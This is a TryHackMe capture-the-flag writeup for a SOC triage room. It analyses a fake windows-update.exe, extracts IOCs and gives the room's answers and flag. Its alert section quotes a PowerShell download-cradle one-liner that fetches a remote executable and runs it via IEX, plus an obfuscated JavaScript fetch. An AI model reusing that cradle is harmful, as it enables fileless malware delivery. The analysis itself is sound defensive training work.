@@ -1,0 +1,263 @@
+# 🔍 SHADOW TRACE — windows-update.exe Analysis (TryHackMe Writeup)
+
+## 🧠 Room Overview
+
+This challenge from TryHackMe simulates a real-world SOC (Security Operations Center) scenario where a suspicious binary (`windows-update.exe`) is discovered on a user’s machine during a night shift.
+
+As the sole analyst, your job is to:
+
+* Analyze the binary
+* Extract Indicators of Compromise (IOCs)
+* Correlate alerts from EDR
+* Identify malicious behavior before it spreads
+
+---
+
+## 🎯 Learning Objectives
+
+* Extract IOCs from suspicious binaries
+* Correlate alerts with malicious activity
+* Perform basic SOC triage
+
+---
+
+## ⚙️ Tools Used
+
+* **Detect It Easy (DIE)**
+* **PEStudio**
+* **strings.exe**
+* **PowerShell**
+* **CyberChef**
+
+---
+
+# 🧪 Static Analysis of `windows-update.exe`
+
+## 1️⃣ Binary Architecture
+
+We start by analyzing the binary using **Detect It Easy (DIE)**:
+
+```
+Path:
+C:\Users\DFIRUser\DFIR Tools\Malware Analysis\DIE
+```
+
+* Load `windows-update.exe`
+* Observe architecture details
+
+✅ **Answer:**
+
+```
+64-bit
+```
+
+---
+
+## 2️⃣ SHA-256 Hash
+
+Within DIE:
+
+* Navigate to **Advanced Options**
+* Locate the **Hash section**
+* Change from **MD5 → SHA-256**
+
+✅ **SHA-256 Hash:**
+
+```
+b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc
+```
+
+---
+
+## 3️⃣ Extracting IOCs (URLs)
+
+We use **PEStudio** to quickly identify suspicious artifacts:
+
+* Open file in PEStudio
+* Navigate to **Strings / Indicators**
+
+Additionally, using `strings.exe`:
+
+```bash
+strings.exe .\windows-update.exe | findstr tryhatme
+```
+
+### 🔎 Output:
+
+```
+http://tryhatme.com/update/security-update.exe
+tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
+responses.tryhatme.com
+```
+
+---
+
+## 4️⃣ Identifying IOC Domains
+
+From extracted strings:
+
+✅ **IOC Domain:**
+
+```
+responses.tryhatme.com
+```
+
+---
+
+## 5️⃣ Decoding Hidden Flag
+
+We notice a Base64 string:
+
+```
+VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
+```
+
+Decode using CyberChef or PowerShell:
+
+```powershell
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0="))
+```
+
+✅ **Decoded Flag:**
+
+```
+THM{you_g0t_some_IOCs_friend}
+```
+
+---
+
+## 6️⃣ Suspicious Library Usage
+
+Using **PEStudio → Libraries Section**
+
+We identify:
+
+```
+WS2_32.dll
+```
+
+✅ **Conclusion:**
+This indicates usage of **Windows Socket API**, commonly used for:
+
+* Network communication
+* Command & Control (C2) activity
+
+---
+
+# 🚨 Alert Analysis (SOC Investigation)
+
+Now we pivot to EDR alerts.
+
+---
+
+## 🔴 Alert 1: Suspicious PowerShell Execution
+
+```
+(new-object system.net.webclient).DownloadString(
+[Text.Encoding]::UTF8.GetString(
+[Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl")
+)) | IEX;
+```
+
+### 🔍 Analysis:
+
+* Base64 decoding reveals:
+
+```
+https://tryhatme.com/dev/main.exe
+```
+
+### ⚠️ Behavior Observed:
+
+* Downloading remote payload
+* Executing directly in memory (`IEX`)
+* Classic **fileless malware technique**
+
+✅ **Malicious URL:**
+
+```
+https://tryhatme.com/dev/main.exe
+```
+
+---
+
+## 🔴 Alert 2: Suspicious Browser Download (Chrome)
+
+```
+fetch([104,116,116,112,...].map(c=>String.fromCharCode(c)).join(''))
+```
+
+### 🔍 Analysis:
+
+This is **character code obfuscation**.
+
+Convert using CyberChef → "From Charcode"
+
+### ✅ Decoded URL:
+
+```
+https://reallysecureupdate.tryhatme.com/update.exe
+```
+
+---
+
+## 7️⃣ File Downloaded via Browser
+
+From the script:
+
+```javascript
+a.download='test.txt';
+```
+
+✅ **Answer:**
+
+```
+test.txt
+```
+
+---
+
+# 🧩 Final IOC Summary
+
+| Type         | Value                                                            |
+| ------------ | ---------------------------------------------------------------- |
+| SHA-256      | b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc |
+| Domain       | tryhatme.com                                                     |
+| URL 1        | http://tryhatme.com/update/security-update.exe                   |
+| URL 2        | https://tryhatme.com/dev/main.exe                                |
+| URL 3        | https://reallysecureupdate.tryhatme.com/update.exe               |
+| Library      | WS2_32.dll                                                       |
+| Dropped File | test.txt                                                         |
+
+---
+
+# 🧠 Key Takeaways
+
+* Always validate “legitimate-looking” binaries like updates
+* Base64 & obfuscation are common in malware delivery
+* PowerShell is heavily abused for fileless execution
+* Browser-based payload delivery is rising (JS fetch abuse)
+* Static + behavioral correlation is critical in SOC work
+
+---
+
+# 🏁 Conclusion
+
+This challenge demonstrates how a seemingly harmless updater can:
+
+* Hide malicious URLs
+* Use encoded payload delivery
+* Execute remote binaries silently
+* Trigger multiple alerts across systems
+
+A proper SOC analyst must:
+
+* Extract IOCs quickly
+* Correlate across alerts
+* Understand attacker techniques
+
+---
+
+Author : Naval Koshti
+
+---
